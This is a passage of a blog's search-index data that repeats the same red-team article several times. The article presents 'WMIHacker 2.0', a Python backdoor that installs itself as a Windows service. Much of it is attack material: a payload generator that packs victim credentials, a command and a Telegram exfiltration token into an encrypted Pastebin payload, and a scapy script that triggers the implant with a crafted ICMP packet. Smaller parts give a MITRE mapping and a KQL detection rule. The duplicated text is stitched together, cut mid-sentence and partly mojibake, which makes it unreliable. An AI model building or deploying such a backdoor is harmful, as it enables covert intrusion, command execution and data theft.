configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be 